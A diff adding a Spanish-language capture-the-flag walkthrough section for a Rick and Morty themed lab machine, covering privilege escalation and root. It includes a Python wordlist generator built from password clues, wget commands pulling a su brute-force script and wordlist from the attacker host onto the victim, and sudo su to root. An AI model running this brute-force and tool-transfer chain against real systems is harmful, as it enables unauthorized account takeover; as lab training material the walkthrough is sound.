@@ -276,9 +276,106 @@ Nos da una contraseña para el journal.txt.zip. Entonces un unzip al journal.txt
 
 Dentro de la ruta /home/RickSanchez/RICKS_SAFE hay un archivo safe. Repetir el proceso de abrir un server local con python y pasarnos el safe. Darle permisos de ejecución y ejecutarlo con el codigo que había dentro de la flag anterior. Ya que el mensaje de no poner este codigo te dice que uses argumentos y en el anterior mensaje no para de repetir la palabra safe.
 
+## Escalar Privilegios
+
+En el archivo safe, que necesitaba el argumento de la flag ./safe 131333, nos da la flag y un mensaje : 
+```bash
+Follow these clues, in order
 
 
+1 uppercase character
+1 digit
+One of the words in my old bands name.
+```
+Esto nos esta diciendo que hay que crear un script para que pruebe combinaciones de contraseñas para escalar a RickSanchez. Puedes hacerla tu o usar IA. En mi caso he descargado un sudo brute force de github para que pruebe las combinaciones dentro de la maquina atacante. También un codigo que me ha generado la IA. Para el nombre de la vieja banda de Rick lo he buscado por internet.
 
+```bash
+https://github.com/Maalfer/Sudo_BruteForce.git
+```
+El codigo este guardar como .py en la maquina atacante. En mi caso aaa.py
+```bash
+import itertools
 
+# Pistas
+mayusculas = [chr(c) for c in range(ord('A'), ord('Z') + 1)]  # A-Z
+digitos = [str(i) for i in range(10)]  # 0-9
+band_words = ["The", "Flesh", "Curtains"]
 
+# Generación de combinaciones
+# Formato: [Letra mayúscula] + [dígito] + [palabra de la banda]
+combinaciones = []
+
+for letra in mayusculas:
+    for digito in digitos:
+        for palabra in band_words:
+            combinaciones.append(f"{letra}{digito}{palabra}")
+            combinaciones.append(f"{letra}{palabra}{digito}")
+            combinaciones.append(f"{palabra}{letra}{digito}")
+            combinaciones.append(f"{palabra}{digito}{letra}")
+
+# Guardar en diccionario.txt
+with open("diccionario.txt", "w") as f:
+    for item in combinaciones:
+        f.write(item + "\n")
+
+print(f"Se han generado {len(combinaciones)} contraseñas en 'diccionario.txt'")
+
+```
+Ejecutarlo con python y te genera un diccionario.
+```bash
+python3 aaa.py
+Se han generado 3120 contraseñas en 'diccionario.txt'
+```
+El diccionario.txt y el Linux-Su-Force.sh, hay que pasarlo a la maquina victima.
+
+Esto en la maquina atacante
+```bash
+python3 -m http.server 8000
+```
+
+Esto en la maquina de Rick
+```bash
+wget http://192.168.56.103:8000/Linux-Su-Force.sh
+wget http://192.168.56.103:8000/diccionario.txt
+```
+Ir a la ruta /home/Summer ya que allí tenemos permisos, Chmod + x Linux-Su-Force.sh y Ejecutar el programa .sh
+
+```bash
+./Linux-Su-Force.sh RickSanchez diccionario.txt
+```
+Esperar a que encuentre la contraseña y escalar a Rick
+
+```bash
+su RickSanchez
+```
+
+## Root
+
+Siendo user RickSanchez sudo -l y se ve que tiene permisos completos.
+
+```bash
+RickSanchez@localhost ~]$ sudo -l
+[sudo] password for RickSanchez: 
+Sorry, try again.
+[sudo] password for RickSanchez: 
+Matching Defaults entries for RickSanchez on localhost:
+    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User RickSanchez may run the following commands on localhost:
+    (ALL) ALL
+
+```
+Entonces con un simple sudo su, ya escalas a root.
+
+```bash
+[RickSanchez@localhost ~]$ sudo su
+[root@localhost RickSanchez]# ls
+```
+
+En el directorio /root/ hay otra flag, con el more la lees.
 
